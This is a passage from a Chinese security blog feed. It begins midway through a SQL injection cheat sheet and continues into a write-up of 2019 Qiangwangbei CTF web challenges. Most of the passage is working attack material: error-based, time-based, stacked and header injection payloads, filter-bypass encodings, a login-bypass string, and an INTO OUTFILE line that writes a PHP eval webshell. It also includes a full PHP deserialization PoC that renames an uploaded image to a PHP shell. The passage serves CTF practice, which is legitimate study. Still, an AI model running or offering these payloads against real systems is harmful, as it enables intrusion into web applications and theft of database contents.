alt="img"></p><p>如果 rand 被禁用了可以使用用户变量来报错(实测未成功)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select min(@a:=1) from information_schema.tables group by concat(password,@a:(@a+1)%2)</span><br></pre></td></tr></table></figure><h2 id="Xpath报错"><a href="#Xpath报错" class="headerlink" title="Xpath报错"></a>Xpath报错</h2><p>这个很常用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//extractvalue </span><br><span class="line">?id=1&apos; and extractvalue(1,concat(0x7e,(select @@version),0x7e)) %23 </span><br><span class="line">//updatexml </span><br><span class="line">?id=1&apos; and updatexml(1,concat(0x7e,(select @@version),0x7e),1) %23</span><br></pre></td></tr></table></figure><h1 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h1><h2 id="sleep"><a href="#sleep" class="headerlink" title="sleep()"></a>sleep()</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and if(ascii(substr(database(),1,1))=115,1,sleep(10))  %23</span><br></pre></td></tr></table></figure><h2 id="benchmark"><a href="#benchmark" class="headerlink" title="benchmark()"></a>benchmark()</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select (if(ascii(substr(current,1,1))=113,benchmark(50000000,encode(&apos;MSG&apos;,&apos;by 5 seconds&apos;)),null)),2,3 from (select database() as current) as tb1 %23</span><br></pre></td></tr></table></figure><h1 id="导入导出"><a href="#导入导出" class="headerlink" title="导入导出"></a>导入导出</h1><p>首先判断当前用户是否具有写入权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;)) and (select count(*) from mysql.user)&gt;0 %23  //返回正确，说明有最高权限</span><br></pre></td></tr></table></figure><p>将 select 内容导入文件，这里的 path 必须要是绝对路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select version() into outfile &quot;path&quot; </span><br><span class="line">//version()也可以换成一句话 </span><br><span class="line">select &lt;?php @eval($_post[&quot;a&quot;])?&gt; into outfile &quot;path&quot;</span><br></pre></td></tr></table></figure><p>这里是可以直接 getshell 的</p><h1 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h1><p>和 GET 注入类似，只是传输的数据不在 URL 中显示，有时需要抓包。常见于登陆的页面</p><p>最常见的一个，万能密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,password from users where username=&apos;$username&apos; and password=&apos;$password&apos; limit 0,1</span><br></pre></td></tr></table></figure><p>提交 username=admin’ #   password=1(任意密码) 即可登陆</p><p>有时候闭合方式会发生变换，有时候会对输入进行检测( check )，没有对哪里检测就从哪里注入(报错注入，布尔盲注，时间盲注，联合查询)</p><h1 id="增删改"><a href="#增删改" class="headerlink" title="增删改"></a>增删改</h1><p>常见于注册(insert)和修改内容(update)的页面，有时需要抓包</p><p>比如修改密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update users set password=&apos;$password&apos; where username=&apos;$username&apos;</span><br></pre></td></tr></table></figure><p>在 password 或者 username 处注入，最常见的用报错注入。有时候闭合方式会发生变换，有时候会对输入进行检测( check )，没有对哪里检测就从哪里报错注入</p><p>这里也会造成二次注入，<a href="https://peri0d.xyz/2019/06/01/%E8%93%9D%E9%B2%B8%E6%89%93%E5%8D%A1Web%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">蓝鲸的一个题目</a></p><h1 id="HEADER头注入"><a href="#HEADER头注入" class="headerlink" title="HEADER头注入"></a>HEADER头注入</h1><p>抓包修改 header 头部，比如 user-agent，referer，cookie</p><p><strong>sqli-labs Less-18</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//Less-19的 referer 同理，也可以用 floor，updatexml </span><br><span class="line">1&apos; and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/3.png" alt="img"></p><p>我觉得Less-18是要输入正确的 uname 和 pass 的，否则是无法显示 user-agent</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/4.png" alt="img"></p><p><strong>Less-20修改cookie</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin1&apos; and extractvalue(1,concat(0x7e,(select @@basedir),0x7e)) #</span><br></pre></td></tr></table></figure><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/5.png" alt="img"></p><h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>这里是针对 ‘ 和 \ 被过滤的情况，一般采用 addslashes() 和 mysql_real_escape_string() 函数</p><p>两者都是对 ‘ 和 \ 进行了 replace 处理，’ 转化为 &#39; ，\ 转化为 \，但是对数字型注入无效</p><p>绕过方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//GET型 </span><br><span class="line">?id=-1%df%27 union select 1 %23 </span><br><span class="line">//POST型，以万能密码为例，&apos; 转为 utf-16 或者 utf-32 </span><br><span class="line">//此处 �&apos; 的 urlencode 为 %ef%bf%bd%27  </span><br><span class="line">name=�&apos; or 1=1 # &amp;pass=111</span><br></pre></td></tr></table></figure><h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p>在 SQL 中，用分号( ; )来表示语句的结尾，如果再 ; 结束一个 SQL 语句之后继续构造下一条语句，是会在一起执行的。对比于 union 的查询语句，堆叠注入可以执行任意语句</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/stack_sql.PNG" alt></p><p>例如 : <a href="https://peri0d.xyz/2019/06/05/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/#%e9%9a%8f%e4%be%bf%e6%b3%a8" target="_blank" rel="noopener">强网杯-随便注</a></p><h1 id="insert-盲注"><a href="#insert-盲注" class="headerlink" title="insert() 盲注"></a>insert() 盲注</h1><p><code>insert(str,pos,len,newstr)</code> : 对字符串 str，从 pos 位置开始，长为 len 个字符的字符串用 newstr 替换</p><p>第一个，对于字符串 <code>123456</code>，从第 1 个位置开始，截取长度为 2 的字符串，即 <code>12</code> 用 <code>xx</code> 替换</p><p>第二个，对于字符串 <code>123456</code>，从第 2 个位置开始，截取长度为 2 的字符串，即 <code>23</code> 用 <code>xx</code> 替换</p><p> <img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/insert_sql.PNG" alt></p><p>当 len 超过 str 的长度时</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/insert_sql_2.PNG" alt></p><p>盲注细节如下 : <a href="https://peri0d.xyz/2019/06/25/2019CISCN%E5%8D%8E%E5%8D%97%E7%BA%BF%E4%B8%8B%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0/#web-4" target="_blank" rel="noopener">ciscn 华南线下 web4</a></p><h1 id="各种绕过"><a href="#各种绕过" class="headerlink" title="各种绕过"></a>各种绕过</h1><h2 id="过滤-和-–"><a href="#过滤-和-–" class="headerlink" title="过滤 # 和 –+"></a>过滤 # 和 –+</h2><p>1、union 联合查询，控制查询结果显示位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,user(),&apos;3</span><br></pre></td></tr></table></figure><p>2、利用 or ‘1’=’1 闭合</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 or extractvalue(1,concat(0x7e,(select user()),0x7e)) or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p>3、编码绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//url encode </span><br><span class="line"># = %23 </span><br><span class="line"></span><br><span class="line">//hex </span><br><span class="line"># = %23  </span><br><span class="line">--+ = %2D%2D%2B </span><br><span class="line"></span><br><span class="line">//unicode </span><br><span class="line"># = \u0023  </span><br><span class="line">--+ = \u002d\u002d\u002b </span><br><span class="line"></span><br><span class="line">//html encode </span><br><span class="line">--+ = &amp;#45;&amp;#45;&amp;#43;  </span><br><span class="line"># = &amp;#35</span><br></pre></td></tr></table></figure><h2 id="过滤-and-和-or"><a href="#过滤-and-和-or" class="headerlink" title="过滤 and 和 or"></a>过滤 and 和 or</h2><p>1、编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//大小写 </span><br><span class="line">OrORoRAND </span><br><span class="line"></span><br><span class="line">//hex </span><br><span class="line">and = %61%6E%64  </span><br><span class="line">or = %6F%72 </span><br><span class="line"></span><br><span class="line">//unicode </span><br><span class="line">and = \u0061\u006e\u0064  </span><br><span class="line">or = \u006f\u0072 </span><br><span class="line"></span><br><span class="line">//html encode </span><br><span class="line">and = &amp;#97;&amp;#110;&amp;#100;       </span><br><span class="line">or = &amp;#111;&amp;#114;</span><br></pre></td></tr></table></figure><p>2、替换</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and = &amp;&amp; </span><br><span class="line">or = ||  </span><br><span class="line">//在 URL 栏中 &amp;&amp; 要换 %26%26</span><br></pre></td></tr></table></figure><h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p>1、特殊字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%a0新建一行 </span><br><span class="line">%0b TAB垂直 </span><br><span class="line">/**/ 注释</span><br></pre></td></tr></table></figure><p>2、编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//unicode </span><br><span class="line">\u0020 </span><br><span class="line"></span><br><span class="line">//html encode</span><br><span class="line">&amp;#32;</span><br></pre></td></tr></table></figure><h2 id="过滤-union-和-select-等"><a href="#过滤-union-和-select-等" class="headerlink" title="过滤 union 和 select 等"></a>过滤 union 和 select 等</h2><p>1、编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//大小写 </span><br><span class="line">UniON  SelEcT </span><br><span class="line"></span><br><span class="line">//hex </span><br><span class="line">union = %75%6E%69%6F%6E  </span><br><span class="line">select = %73%65%6C%65%63%74 </span><br><span class="line"></span><br><span class="line">//unicode </span><br><span class="line">union = \u0075\u006e\u0069\u006f\u006e  </span><br><span class="line">select = \u0073\u0065\u006c\u0065\u0063\u0074 </span><br><span class="line"></span><br><span class="line">//html encode </span><br><span class="line">union = &amp;#32;&amp;#117;&amp;#110;&amp;#105;&amp;#111;&amp;#110;</span><br><span class="line">select = &amp;#115;&amp;#101;&amp;#108;&amp;#101;&amp;#99;&amp;#116;</span><br></pre></td></tr></table></figure><p>2、重复(只过滤一次时)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ununionion</span><br><span class="line">selselectect</span><br></pre></td></tr></table></figure><p>3、注释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/*!union*/ </span><br><span class="line">/*!select*/</span><br></pre></td></tr></table></figure><h2 id="过滤-‘-和"><a href="#过滤-‘-和" class="headerlink" title="过滤 ‘ 和 \"></a>过滤 ‘ 和 \</h2><p>1、宽字节注入</p><p>2、编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">//url encode </span><br><span class="line">&apos; = %27 </span><br><span class="line">\ = %5c </span><br><span class="line"></span><br><span class="line">//hex </span><br><span class="line">&apos; = %27 </span><br><span class="line">\ = %5c </span><br><span class="line"></span><br><span class="line">//unicode </span><br><span class="line">&apos; = \u0027 </span><br><span class="line">\ = \u005c </span><br><span class="line"></span><br><span class="line">//html encode </span><br><span class="line">&apos; = &amp;#39;</span><br><span class="line">\ = &amp;#92;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;自己做的注入总结，包含了常见的问题，会随着比赛的扩充而扩充&lt;/p&gt;
    
    </summary>
    
      <category term="总结" scheme="http://yoursite.com/categories/%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="SQL" scheme="http://yoursite.com/tags/SQL/"/>
    
      <category term="总结" scheme="http://yoursite.com/tags/%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>强网杯web复现</title>
    <link href="http://yoursite.com/2019/06/05/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/2019/06/05/2019强网杯web复现/</id>
    <published>2019-06-05T04:17:46.234Z</published>
    <updated>2019-08-27T15:32:08.124Z</updated>
    
    <content type="html"><![CDATA[<p>平台：<a href="https://buuoj.cn/challenges" target="_blank" rel="noopener">https://buuoj.cn/challenges</a></p><p>2019 强网杯的题目总结</p><a id="more"></a><h1 id="UPLOAD"><a href="#UPLOAD" class="headerlink" title="UPLOAD"></a>UPLOAD</h1><h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><p>大佬的 wp : <a href="https://www.zhaoj.in/read-5873.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-5873.html</a></p><h2 id="个人总结"><a href="#个人总结" class="headerlink" title="个人总结"></a>个人总结</h2><ol><li><p>只能上传正常的图片，非 png 格式会自动转化为 png，图片被保存在 upload 目录下</p></li><li><p>本题是 <a href="http://www.tar.gz" target="_blank" rel="noopener">www.tar.gz</a> 泄露，源码泄露总结<a href>点击此处</a></p><!--more--></li><li><p>函数流程：</p><ol><li>没有登陆时，跳转到 index.php，进行注册登陆。login_check 函数将 cookie(‘user’) 赋给 profile，然后 base64 解码反序列化</li><li>在注册页面调用 login_check 函数检查是否登陆，是则跳转到 index.php/home ，否则进行注册</li><li>在登陆页面调用 login_check 函数检查是否登陆，是则跳转到 index.php/home ，否则进行登陆</li><li>已经登陆时，跳转到 index.php/home 进行文件上传操作</li><li>在进行上传操作时，对请求头中的 REMOTE_ADDR 进行 md5 加密并赋给 upload_menu ，然后创建以 upload_menu 命名的文件夹</li><li>然后进行登陆检查，然后将文件的临时副本的名称赋给 filename_tmp，将文件名(不加后缀)进行 md5 加密后赋给 filename</li><li>然后进行后缀检测，将 filename 的后缀赋给 ext，如果 ext 为 png 返回 1，否则返回 0</li><li>如果后缀是 png，检查图片内容，然后将 filename 赋给 filename_tmp，将图片相对路径赋给 img，执行 update_img 函数</li><li>update_img 函数先进行 user 查询，如果 user 没有上传过图片并且 img 存在，则更新 user 表的 img 字段，并执行 update_cookie 函数</li><li>update_cookie 函数将上传图片的 img 进行序列化和 base64 编码后赋给 cookie 的 user</li><li>profile 的 _call 和 _get 两个魔术方法，分别书写了在调用不可调用方法和不可调用成员变量时怎么做。__get 会直接从 except 里找，__call 会调用自身的 name 成员变量所指代的变量所指代的方法。</li></ol></li><li><p>攻击流程：</p><ol><li><p>注册，登陆。登陆之后有个跳转的过程，这里就有了 cookie，如图</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/buuctf/qwb_upload_1.png" alt></p><p>解码后如图</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/buuctf/qwb_upload_2.png" alt></p></li><li><p>选择上传图片，这个图片就是合成的图片马，从 <a href="https://www.iconfont.cn/" target="_blank" rel="noopener">阿里巴巴矢量图库</a> 下载一个 png 图片，然后蚁剑生成一个 shell，用 hex 编辑器直接将 shell 内容放在图片后面即可。这里使用阿里的图库是因为网上的 png 图片可能 hex 格式不规范，导致后面改名之后会报 parse error</p></li><li><p>上传图片之后，会在 upload 目录下生成一个 md5(REMOTE_ADDR) 文件，而且文件名也会被 md5 加密，这时 cookie[‘user’] 如图</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/buuctf/qwb_upload_3.png" alt></p><p>解码后如图</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/buuctf/qwb_upload_4.png" alt></p></li><li><p>使用 poc 生成的序列化结果修改 cookie[‘user’]，刷新一次即可修改后缀。在服务器反序列化的过程中，在 Register 类中执行析构函数，调用 $profile 的 index() 函数，在 Profile 类的 __get 函数中定义了如果调用 index() 就去调用 img，而 __call 函数规定调用不可调用的函数时就调用 img 对应的函数，这样就控制函数跳转到 upload_img 函数，然后执行复制函数，将 png 改为 php，并删除原有的 png，至此，后缀修改完成。</p></li><li><p>最后直接用蚁剑连接 shell，读取配置文件中的数据库信息，选择 mysqli 驱动连接到数据库，即可读取 flag</p></li></ol></li><li><p>最终 poc 如下，修改上传图片地址即可</p></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $filename_tmp;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $upload_menu;</span><br><span class="line">    <span class="keyword">public</span> $ext;</span><br><span class="line">    <span class="keyword">public</span> $img;</span><br><span class="line">    <span class="keyword">public</span> $except;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $registed;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$profile = <span class="keyword">new</span> Profile();</span><br><span class="line">$profile-&gt;except = [<span class="string">'index'</span> =&gt; <span class="string">'img'</span>];</span><br><span class="line">$profile-&gt;img = <span class="string">"upload_img"</span>;</span><br><span class="line">$profile-&gt;ext = <span class="string">"png"</span>;</span><br><span class="line"><span class="comment">//修改地址即可</span></span><br><span class="line">$profile-&gt;filename_tmp = <span class="string">"../public/upload/24ff17b3e72d90d210f3455327ea52f7/36a767e7b2d8d3bde3f881217a418ebb5.png"</span>;</span><br><span class="line">$profile-&gt;filename = <span class="string">"../public/upload/24ff17b3e72d90d210f3455327ea52f7/6a767e7b2d8d3bde3f881217a418ebb5.php"</span>;</span><br><span class="line"></span><br><span class="line">$register = <span class="keyword">new</span> Register();</span><br><span class="line">$register-&gt;registed = <span class="keyword">false</span>;</span><br><span class="line">$register-&gt;checker = $profile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode(serialize($register)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>mysqli 是 PHP 驱动数据库的一种方式，以前是使用 mysql 的，而 mysqli 相比于 mysql 更加安全高效</p><p>copy(a, b)，a 和 b 是文件路径，将文件从 a 拷贝到 b，比如 copy(“./1.png”, “./1.php” ) 执行之后会存在两个文件 1.png 和 1.php</p><p>unlink(a)，a 是文件路径，删除文件 a</p></blockquote><h1 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h1><h2 id="wp-1"><a href="#wp-1" class="headerlink" title="wp"></a>wp</h2><ol><li><p>打开靶机，随便提交，发现似乎是把 PHP 查询的原始结果之间返回了</p></li><li><p>输入 select 发现了过滤语句，过滤了 select，update，delete，drop，insert，where 和 . </p><p><code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></p></li><li><p>测试一下有没有注入。<code>?inject=1&#39;%23</code>，返回正常，字符型注入</p></li><li><p>过滤了这么多关键词，尝试堆叠注入。<code>?inject=1&#39;;show databases;%23</code>，看到了所有的数据库</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/buuctf/qwb_supersql_1.png" alt></p></li><li><p>再看一下所有的表。<code>?inject=1&#39;;show tables;%23</code>，1919810931114514 表和 words 表</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/buuctf/qwb_supersql_2.png" alt></p></li><li><p>flag 在全数字的表里，默认查询的是 words 表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?inject=1&apos;;show columns from `1919810931114514`;%23</span><br><span class="line">?inject=1&apos;;show columns from `words`;%23</span><br></pre></td></tr></table></figure><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/6.png" alt></p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/7.png" alt></p></li><li><p>既然没过滤 alert 和 rename，那就可以把表和列改名。先把 words 改为 words1，再把数字表改为 words，然后把新的 words 表里的 flag 列改为 id ，这样就可以直接查询 flag 了</p></li><li><p>构造 payload 如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?inject=1&apos;;RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;%23</span><br></pre></td></tr></table></figure></li><li><p>使用  <code>/?inject=1&#39; or &#39;1&#39;=&#39;1</code> 访问一下即可获得 flag</p></li></ol><h2 id="个人总结-1"><a href="#个人总结-1" class="headerlink" title="个人总结"></a>个人总结</h2><ol><li><p>MySQL中反引号和单引号的区别与用法</p><ol><li>MySql 中用一对反引号来标注 SQL 语句中的标识，如<strong>数据库名、表名、字段名</strong>等</li><li>引号则用来标注语句中所引用的字符型常量或日期/时间型常量，即<strong>字段值</strong></li><li>例如：select * from `username` where `name`=”peri0d”</li></ol></li><li><p>PHP 代码推测，这里只是一个大概的流程，和实际可能有出入。参照 sqli-labs 里的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($inject)</span></span>&#123;</span><br><span class="line">preg_match(<span class="string">"/select|update|delete|drop|insert|where|\./i"</span>,$inject);</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'inject'</span>]))&#123;</span><br><span class="line">$id = $_GET[<span class="string">'inject'</span>];</span><br><span class="line">waf($id);</span><br><span class="line"></span><br><span class="line">$con1 = mysqli_connect($host,$dbuser,$dbpass,$dbname);</span><br><span class="line">$sql = <span class="string">"select * from `words` where id = '$id';"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* execute multi query */</span></span><br><span class="line"><span class="keyword">if</span> (mysqli_multi_query($con1, $sql))&#123;</span><br><span class="line"><span class="comment">/* store first result set */</span></span><br><span class="line">$result = mysqli_multi_query($con1);</span><br><span class="line"><span class="keyword">if</span> ($result)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>($row = mysqli_fetch_row($result))</span><br><span class="line">&#123;</span><br><span class="line">  var_dump($row);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* print divider */</span></span><br><span class="line"><span class="keyword">if</span> (mysqli_more_results($con1))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">mysqli_close($con1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>MySQL 的 show、rename 和 alter 命令</p><ol><li>show 可以用于查看当前数据库，当前表，以及表中的字段</li><li>rename 用于修改 table 的名称</li><li>alter 